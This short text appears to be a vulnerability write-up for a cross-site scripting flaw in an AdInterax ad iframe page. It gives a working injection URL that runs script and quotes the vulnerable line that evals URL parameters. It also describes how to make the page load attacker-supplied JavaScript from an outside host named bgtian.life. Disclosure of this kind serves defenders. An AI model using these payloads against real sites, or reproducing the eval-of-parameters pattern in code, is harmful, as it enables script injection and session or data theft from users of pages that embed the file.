/adinterax/adx-iframe-v2.html?xxx=1%27;alert();//&nest=1

The script first simply eval almost all param/value in the URL
if(i>2)eval("var "+k+"='"+v+"'");

But if you prefer the confort of loading your own script then just load
/adinterax/adx-iframe-v2.html?ad=bgtian.life and put your js in a file named ad-iframe.js (only work with http, not https)
